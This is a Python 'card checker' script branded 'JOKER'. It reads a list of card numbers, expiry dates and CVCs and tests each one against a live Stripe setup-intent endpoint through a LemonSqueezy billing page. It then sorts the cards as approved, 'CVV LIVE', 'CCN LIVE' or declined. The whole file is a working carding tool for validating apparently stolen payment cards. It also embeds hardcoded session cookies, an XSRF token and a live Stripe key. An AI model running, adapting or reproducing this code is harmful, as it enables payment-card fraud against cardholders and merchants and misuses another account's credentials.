try:
 import pyfiglet,requests,os
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('clear')
file=open('JOK.txt',"+r")#combo name
#BY @X1_H9
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('           JOKER ')
print(Z+logo)
o=("#====================================##============================")
print (F+'START')
print(F+o)
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	cookies = {
    '_fbp': 'fb.1.1699480248535.347221844',
    'ls_customer': 'f43b80ee2427a7c5cc4ee1c3af23d874',
    'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6IkFyakZwSWVFWDZmbVJlWXFEazZVSXc9PSIsInZhbHVlIjoiK2ptdG1CUmd4dG1rOEZsY29tbG55dkV4ZWJuYlhmRXhuYmgvTzU3ZkFWajJoSis4ZUY5VlBJWmFkb1QrdzFGc0lRczVrV0s1MC9Uc0lEZzVZUlBGb1NZZmhaVkJSdm80UmQwR3I3S20yaittSitJWEl5cXBtVzc0WGZidXltZlFGRUhZZWlLTXRjSkQvbm5teEtScVVVdjE2QzViZW0vdmRqSEgxcG00U0hsZldvRTRrdXI1RFdSbWs5akR5cGZEdHdYbE5zT1ZhUFFWTXpwVVJueklDNVNCMDJVbHg0WHNHMksyYmhxMURqbz0iLCJtYWMiOiJlMDMxZmQzNzMzMzE2NGYzNGFiOTA0MjdjZTQ3N2Y4OWIyZDZkNDYzNWNmY2E0ZjYwZWNjOGE3YjRlOTI1MmQ1IiwidGFnIjoiIn0%3D',
    'intercom-device-id-goppktf8': 'f4267a06-e23e-4088-a4d6-31defcf99041',
    '__stripe_mid': 'c8a121d2-e9cf-4af9-8e0d-fe48944fc779a2bd9d',
    '__stripe_sid': 'fa63d1f6-812c-4804-97e3-768737055f0f54e415',
    'intercom-session-goppktf8': 'bVNESVRVZlNLd0FGOVlvUmkvNGpvS01qdXJBVG5LQ3BwME0zZ3poNVJ0bXNNR2N0cThUa0hUWHRseFB5VTRhMC0teHRZMWwrMmJVWkg4ZVRnb2NOYW9Rdz09--dc853f7a66ec8c454a2305b7f7be73de6c6ba0a3',
    'laravel_token': 'eyJpdiI6IjlDYjN6T0FZeGFDNkJmNnRZTEMxWnc9PSIsInZhbHVlIjoiejJzNm1WcEdlNW5EZnVFVmEyQ3RUMWgrNkszMkN0amFFVzZhSXF5NHBHdG5NSjV5OTVMUmY3Q0FFZXdQTVZ4V1RtQXNnVmtKcmtCbXYwR1FFamY3ei9JaWJ3bDRMSjcxM0czL1F0cHFVVkZUVkFNNlBnQzZtMGd4dmcrRmNoVmhMVDhydkZiNnpOeDRCRGpPdkJscFVGSW54ZVdZVmtQOUFwZE5YdmVac1RZWDVHV1pZaUJnRm1Dd3NDWUNVUVIrekNlVXNQQU1uSjVNSW1aSEpyRVVTcjBreExWaXg3M2pRR21POGxPL0ZWSWoxdnV5Rmc4ZlFvN09peHZ3b0Jlbm1aZ0NxRU9kOElXZ1p1M2xtc3VLdWs3NWUyS2kzR3FsK3VmOWd5RGp6d2ZNSzhPYkQ0VlFZa2djekR2YjV6bGQiLCJtYWMiOiJlZTkzY2ExNDJjZjE1MDQwMGI3NTcyNTI3ODk3Y2MxOGRiYjFkYzk3MTNjZjlkZjFlNmFhZWFlYjM1NTc3NDMzIiwidGFnIjoiIn0%3D',
    'laravel_session': 'eyJpdiI6Ik45c3lsSGFleDZYZmlGVmxWL3hVc0E9PSIsInZhbHVlIjoiV0Q4TEVQcFJLVW1Rdm11WDFKNGMwNng0amllSmZkWEIzbGtBbDM5TVRVTk9oN0dpY3puMTRzbHV2RmRReTBaNE9FNmgwWEt2N24raUVReXpZcC84Mm5xVHdMdU5FbFpPclB3ZW83MnN4dVY5NnhXcHJqcHpBN01UdWJXZ0pRZTIiLCJtYWMiOiI2NTk5ZjVlYzJhYjg3NzdhOTE0MmYyYmM2NzFlZTc4NDkyMDQwYmJmNTEwNjgwYjZkMGRmNjZiZjkwMjIyMGI0IiwidGFnIjoiIn0%3D',
    'XSRF-TOKEN': 'eyJpdiI6ImpwUEZNVjhmbC8zc3ptMUluUm9PL3c9PSIsInZhbHVlIjoiS01HSG5xalR2ZmZadHdyc1g4MiswWDZaMEUwSWVYVER4T1pVS1JaMHd3MlE3eTc5ZDdsOGtzZFdVT3ZVYWwwSEhKVi9JRTUrZzBGNFBOMFdBV21RaXpMQWVQK2p3d1piSmwwVGRQMUVqTzY5ZlFRazF1SkUrNk1XRWEvdlZTS0siLCJtYWMiOiI4OWEyZDNmZjA5YzkxMjRiNTQzMDFhMGE4ZmIwMjVlMzJjNTc5ZTFhOWRkOTZlMmI0M2EwMWNiOTkzNGU5ZTM3IiwidGFnIjoiIn0%3D',
}

	headers = {
    'authority': 'app.lemonsqueezy.com',
    'accept': 'text/html, application/xhtml+xml',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_fbp=fb.1.1699480248535.347221844; ls_customer=f43b80ee2427a7c5cc4ee1c3af23d874; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkFyakZwSWVFWDZmbVJlWXFEazZVSXc9PSIsInZhbHVlIjoiK2ptdG1CUmd4dG1rOEZsY29tbG55dkV4ZWJuYlhmRXhuYmgvTzU3ZkFWajJoSis4ZUY5VlBJWmFkb1QrdzFGc0lRczVrV0s1MC9Uc0lEZzVZUlBGb1NZZmhaVkJSdm80UmQwR3I3S20yaittSitJWEl5cXBtVzc0WGZidXltZlFGRUhZZWlLTXRjSkQvbm5teEtScVVVdjE2QzViZW0vdmRqSEgxcG00U0hsZldvRTRrdXI1RFdSbWs5akR5cGZEdHdYbE5zT1ZhUFFWTXpwVVJueklDNVNCMDJVbHg0WHNHMksyYmhxMURqbz0iLCJtYWMiOiJlMDMxZmQzNzMzMzE2NGYzNGFiOTA0MjdjZTQ3N2Y4OWIyZDZkNDYzNWNmY2E0ZjYwZWNjOGE3YjRlOTI1MmQ1IiwidGFnIjoiIn0%3D; intercom-device-id-goppktf8=f4267a06-e23e-4088-a4d6-31defcf99041; __stripe_mid=c8a121d2-e9cf-4af9-8e0d-fe48944fc779a2bd9d; __stripe_sid=fa63d1f6-812c-4804-97e3-768737055f0f54e415; intercom-session-goppktf8=bVNESVRVZlNLd0FGOVlvUmkvNGpvS01qdXJBVG5LQ3BwME0zZ3poNVJ0bXNNR2N0cThUa0hUWHRseFB5VTRhMC0teHRZMWwrMmJVWkg4ZVRnb2NOYW9Rdz09--dc853f7a66ec8c454a2305b7f7be73de6c6ba0a3; laravel_token=eyJpdiI6IjlDYjN6T0FZeGFDNkJmNnRZTEMxWnc9PSIsInZhbHVlIjoiejJzNm1WcEdlNW5EZnVFVmEyQ3RUMWgrNkszMkN0amFFVzZhSXF5NHBHdG5NSjV5OTVMUmY3Q0FFZXdQTVZ4V1RtQXNnVmtKcmtCbXYwR1FFamY3ei9JaWJ3bDRMSjcxM0czL1F0cHFVVkZUVkFNNlBnQzZtMGd4dmcrRmNoVmhMVDhydkZiNnpOeDRCRGpPdkJscFVGSW54ZVdZVmtQOUFwZE5YdmVac1RZWDVHV1pZaUJnRm1Dd3NDWUNVUVIrekNlVXNQQU1uSjVNSW1aSEpyRVVTcjBreExWaXg3M2pRR21POGxPL0ZWSWoxdnV5Rmc4ZlFvN09peHZ3b0Jlbm1aZ0NxRU9kOElXZ1p1M2xtc3VLdWs3NWUyS2kzR3FsK3VmOWd5RGp6d2ZNSzhPYkQ0VlFZa2djekR2YjV6bGQiLCJtYWMiOiJlZTkzY2ExNDJjZjE1MDQwMGI3NTcyNTI3ODk3Y2MxOGRiYjFkYzk3MTNjZjlkZjFlNmFhZWFlYjM1NTc3NDMzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik45c3lsSGFleDZYZmlGVmxWL3hVc0E9PSIsInZhbHVlIjoiV0Q4TEVQcFJLVW1Rdm11WDFKNGMwNng0amllSmZkWEIzbGtBbDM5TVRVTk9oN0dpY3puMTRzbHV2RmRReTBaNE9FNmgwWEt2N24raUVReXpZcC84Mm5xVHdMdU5FbFpPclB3ZW83MnN4dVY5NnhXcHJqcHpBN01UdWJXZ0pRZTIiLCJtYWMiOiI2NTk5ZjVlYzJhYjg3NzdhOTE0MmYyYmM2NzFlZTc4NDkyMDQwYmJmNTEwNjgwYjZkMGRmNjZiZjkwMjIyMGI0IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImpwUEZNVjhmbC8zc3ptMUluUm9PL3c9PSIsInZhbHVlIjoiS01HSG5xalR2ZmZadHdyc1g4MiswWDZaMEUwSWVYVER4T1pVS1JaMHd3MlE3eTc5ZDdsOGtzZFdVT3ZVYWwwSEhKVi9JRTUrZzBGNFBOMFdBV21RaXpMQWVQK2p3d1piSmwwVGRQMUVqTzY5ZlFRazF1SkUrNk1XRWEvdlZTS0siLCJtYWMiOiI4OWEyZDNmZjA5YzkxMjRiNTQzMDFhMGE4ZmIwMjVlMzJjNTc5ZTFhOWRkOTZlMmI0M2EwMWNiOTkzNGU5ZTM3IiwidGFnIjoiIn0%3D',
    'referer': 'https://app.lemonsqueezy.com/store/billing/card',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-inertia': 'true',
    'x-inertia-version': '2ea74fd67aab6331acd6cd089cbe83b0',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'eyJpdiI6ImxzQVNvNFUrN2YzTkxaTTkxeFBoQ0E9PSIsInZhbHVlIjoiOGdyejl2YUlJa0FOeTJRbDFOc2xXNFZJeE1EVURHMGpYQ3RBNUQ3aSsxUzA0NS84Y294Ukk1NVpFRkJNVGZtZnVWVUoyVjE2VUNqTjBkd3BqelJoS3A0RXlzck9pcms0Y2xPbm1mUXpMMmlpQk53ckZHWmJTWng5aGZjMkZIZmoiLCJtYWMiOiI5MjZkYWQ1Y2E3NWYwNGY5MDI5NzJmNDljNTI3NzYwYmZiMDgzMjgxNDU5ZjI0MzZiNTEwMjI0Mzc1OGQ4Yzk1IiwidGFnIjoiIn0=',
}

	r1 = requests.get('https://app.lemonsqueezy.com/store/billing/card', cookies=cookies, headers=headers)
	st=(r1.json()['props']['panelData']['props']['clientSecret'])
	st1=st.split('_secret_')[0]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}

	data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=JOKER&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][state]=NY&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=5aac1b4f-d33c-4886-b43e-7ef07b95bd9a68c502&payment_method_data[muid]=c8a121d2-e9cf-4af9-8e0d-fe48944fc779a2bd9d&payment_method_data[sid]=fa63d1f6-812c-4804-97e3-768737055f0f54e415&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F15750db12e%3B+stripe-js-v3%2F15750db12e%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fapp.lemonsqueezy.com&payment_method_data[time_on_page]=59190&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51Jgu2GICFkNQwM9ZSNKmpL4LyG7eqTfnQL60AqyiHXUQP3t03hJVP9bDXc0kTP0RruExau1inV6y5Uic5y9Wz1Xt00onuNBgn3&client_secret={st}'

	r2 = requests.post(
    f'https://api.stripe.com/v1/setup_intents/{st1}/confirm',
    headers=headers,
    data=data,
)
	if "succeeded" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅')
	elif "insufficient funds" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅(CVV LIVE)')
	elif "security code is incorrect" in r2.text or "ZIP INCORRECT" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅(CCN LIVE)')
	else:
		print(Z+f'[ {start_num} ]',P,' ➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')	